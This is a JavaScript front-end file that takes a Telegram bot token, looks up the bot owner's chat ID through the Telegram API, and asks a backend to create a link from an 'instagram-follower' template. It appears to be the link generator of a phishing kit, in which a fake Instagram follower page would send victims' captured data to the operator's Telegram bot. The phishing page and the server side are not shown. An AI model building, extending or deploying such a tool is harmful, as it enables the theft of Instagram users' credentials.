const start_btn = document.getElementById('start');
const token_input = document.getElementById('token');
const TEL_URL = "https://api.telegram.org/bot"
const message_box = document.getElementById("messsage");
const error_message_node = document.createElement('p');
const url_message_node = document.createElement('p');




const loader = document.createElement("span");

!function setLoading() {
  // loader 
  loader.role = "status";
  const classes = ["animate-spin" ,"inline-block","w-4", "h-4", "border-[3px]", "border-current", "border-t-transparent", "text-white", "rounded-full"]
  classes.map( e => {
    loader.classList.add(e)
  });
  
  // error message 
  
  ["font-bold" ,"text-sm" ,"py-2" ,"dark:text-red-700" ,"text-red-700"].map(e => {
    error_message_node.classList.add(e)
  });
  ["font-bold", "text-sm", "py-2", "dark:text-white", "text-gray-800"].map(e => {
    url_message_node.classList.add(e)
  })
  
}();


function showError(msg){
  error_message_node.innerText = `Error : ${msg}`;
  message_box.appendChild(error_message_node)
}

function removeError(){
  try{
      message_box.removeChild(error_message_node)
  }catch(e){
    
  }
  
}

function getChats(token){
  return fetch(`${TEL_URL}${token}/getUpdates`);
}


function extractID(data)  {
  if(data.result?.length){
    let id = data.result[0]['message']['from']['id'];
    return id;
  }
  return ({
    error : "Chat ID Not Found ! Please Send A Message To Your Bot"
  })
}




start_btn.onclick = async function(e) {
  removeError();
  const token = token_input.value;
  
  if(!token){
    return showError("Please Enter Token")
  }
  
  start_btn.appendChild(loader)
  
  try {
    const res = await getChats(token);
    if(res.status !== 200 ) {
      start_btn.removeChild(loader);
      
      return showError("token is Not Valid")
    }
    const chats = await res.json();
    
    const id = extractID(chats);
    
    if(id.error){
      start_btn.removeChild(loader)
      return showError(id.error)
    }
    
    const main_res = await fetch("/api/create_url", {
      method : "POST",
      headers : {
        'Content-Type' : 'application/json'
      },
      body : JSON.stringify({
        chat_id: id,
        bot_token:token,
        template:"instagram-follower",
      })
    });
    
    
    const main_json = await main_res.json();
    if(main_res.status !== 201)
    {
      start_btn.removeChild(loader);
      return showError(main_json.error)
    }
    
    // everything is fine ....
    
    url_message_node.innerText = `${window.location.origin}${main_json.url}`;
    message_box.appendChild(url_message_node);
    start_btn.removeChild(loader);
  } catch (e) {
    start_btn.removeChild(loader)
    showError(e.message)
  }
}


